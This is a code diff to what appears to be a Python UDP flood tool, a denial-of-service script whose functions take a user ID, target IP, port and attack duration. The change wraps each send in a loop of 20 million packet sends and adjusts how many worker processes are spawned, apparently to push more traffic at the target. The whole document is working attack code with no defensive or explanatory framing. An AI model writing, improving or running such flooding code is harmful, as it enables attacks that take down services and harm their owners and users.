@@ -32,7 +32,8 @@ def udp_flood(target_ip, target_port, stop_flag):
         try:
             packet_size = random.randint(64, 1469)
             data = os.urandom(packet_size)
-            sock.sendto(data, (target_ip, target_port))
+            for _ in range(20000000): 
+                sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
             break
@@ -46,7 +47,7 @@ def start_udp_flood(user_id, target_ip, target_port, attack_time):
     global_active_attack.set()
 
     processes = []
-    for _ in range(min(20000000, multiprocessing.cpu_count())):
+    for _ in range(min(500, multiprocessing.cpu_count())):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
